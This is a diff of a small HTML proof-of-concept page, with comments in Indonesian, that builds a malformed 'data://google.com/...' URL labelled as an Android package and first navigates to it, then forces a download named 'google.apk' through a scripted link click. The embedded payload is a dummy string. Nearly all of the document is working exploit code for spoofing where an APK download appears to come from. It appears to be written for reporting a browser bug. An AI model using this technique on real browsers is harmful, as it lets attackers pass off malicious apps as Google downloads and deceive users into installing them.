@@ -6,22 +6,40 @@
 </head>
 <body>
 
-<h3>Malformed data:// APK PoC</h3>
-<button onclick="go()">Start</button>
+<h3>Press the button to start download PoC</h3>
+<button id="start">Start PoC</button>
 
 <script>
-function go() {
-  // base64 dummy
-  const base64 = "ZXN0dGVzdGVzdA==";
+document.getElementById('start').addEventListener('click', () => {
+  try {
+    // Dummy base64 content
+    const base64 = "ZXN0dGVzdGVzdA=="; // "esttesttest" dalam base64
 
-  // malformed data URL (inti bug)
-  const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;
+    // Malformed data URL
+    const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;
 
-  // langsung navigate (lebih powerful)
-  location.href = payload;
+    // Cara 1: langsung navigate (kalau browser masih vulnerable)
+    try {
+      location.href = payload;
+      console.log("Navigation attempted via location.href");
+    } catch (e) {
+      console.warn("Navigation blocked, fallback to link:", e);
+    }
 
-  console.log("Trying malformed data:// navigation");
-}
+    // Cara 2: fallback via <a> click (harus user gesture)
+    const a = document.createElement('a');
+    a.href = payload;
+    a.download = "google.apk";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+    console.log("Download triggered via <a> click");
+
+  } catch (err) {
+    console.error("PoC failed:", err);
+  }
+});
 </script>
 
 </body>
